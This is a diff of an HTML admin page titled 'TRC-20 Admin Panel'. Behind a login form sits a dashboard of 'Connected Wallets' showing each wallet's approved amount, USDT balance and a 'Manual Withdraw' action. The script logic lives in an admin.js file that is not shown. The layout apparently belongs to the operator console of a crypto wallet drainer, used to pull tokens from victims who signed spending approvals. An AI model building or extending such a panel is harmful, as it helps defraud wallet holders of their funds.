@@ -3,42 +3,35 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Admin Panel - Project A</title>
+  <title>TRC-20 Admin Panel</title>
   <link rel="stylesheet" href="admin.css" />
 </head>
 <body>
-  <div class="login-container" id="loginBox">
-    <h2>Admin Login</h2>
-    <input type="text" id="username" placeholder="Username" />
-    <input type="password" id="password" placeholder="Password" />
-    <button onclick="login()">Login</button>
-  </div>
+  <div class="container">
+    <h1>Admin Panel (TRC-20)</h1>
+    <div id="loginSection">
+      <input type="text" id="username" placeholder="Username" />
+      <input type="password" id="password" placeholder="Password" />
+      <button onclick="login()">Login</button>
+    </div>
 
-  <div id="adminPanel" class="hidden">
-    <h1>Project A - Admin Panel</h1>
-    
-    <input type="text" id="searchInput" placeholder="Search wallet..." />
-    
-    <div id="walletLogs">
+    <div id="dashboard" style="display:none;">
+      <h2>Connected Wallets</h2>
       <table>
         <thead>
           <tr>
-            <th>Time</th>
-            <th>Network</th>
             <th>Wallet Address</th>
-            <th>Balance (USDT)</th>
-            <th>Approved</th>
+            <th>Approved Amount</th>
+            <th>USDT Balance</th>
             <th>Manual Withdraw</th>
           </tr>
         </thead>
-        <tbody id="logTable"></tbody>
+        <tbody id="walletTableBody"></tbody>
       </table>
     </div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
-  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
-  <script src="admin.js"></script>
+  <script type="module" src="admin.js"></script>
 </body>
 </html>
